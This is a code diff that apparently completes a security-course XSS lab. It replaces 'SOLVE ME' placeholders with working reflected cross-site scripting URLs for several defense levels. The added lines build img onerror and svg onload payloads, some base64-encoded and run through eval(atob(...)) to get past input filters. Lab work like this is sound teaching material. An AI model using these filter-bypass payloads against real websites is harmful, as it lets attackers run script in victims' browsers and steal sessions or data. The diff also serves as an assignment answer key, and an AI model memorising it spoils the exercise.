@@ -303,17 +303,17 @@ function makeLink(target, attacker, defense) {
                     "</script" + ">"
                 );
         case 3:
-            // TODO: generate XSS URL for defense level 2.2.3.3
-            return target + "search?xssdefense=" + (defense-2) + "&q=" + "SOLVE ME"
+            // DONE: generate XSS URL for defense level 2.2.3.3
+            return target + "search?xssdefense=" + (defense-2) + "&q=" + encodeURIComponent("<img src=# onerror='" + payload_string + ";payload();" + "'>");
         case 4:
-            // TODO: generate XSS URL payload for defense level 2.2.3.4
-            return target + "search?xssdefense=" + (defense-2) + "&q=" + "SOLVE ME"
+            // DONE: generate XSS URL payload for defense level 2.2.3.4
+            return target + "search?xssdefense=" + (defense-2) + "&q=" + encodeURIComponent("<img src=# onerror='" + payload_string + ";payload();" + "'>");
         case 5:
-            // TODO: generate XSS URL payload for defense level 2.2.3.5
-            return target + "search?xssdefense=" + (defense-2) + "&q=" + "SOLVE ME"
+            // DONE: generate XSS URL payload for defense level 2.2.3.5
+            return target + "search?xssdefense=" + (defense-2) + "&q=" + encodeURIComponent(`<svg/onload=eval(atob('` + btoa(payload_string + ";payload();") + `'))>`);
         case 6:
-            // TODO: generate XSS URL payload for defense level 2.2.3.6
-            return target + "search?xssdefense=" + (defense-2) + "&q=" + "SOLVE ME"
+            // DONE: generate XSS URL payload for defense level 2.2.3.6
+            return target + "search?xssdefense=" + (defense-2) + "&q=" + encodeURIComponent('<svg/onload=eval(atob(`' + btoa(payload_string + ";payload();") + '`))>');
     }
 }
 
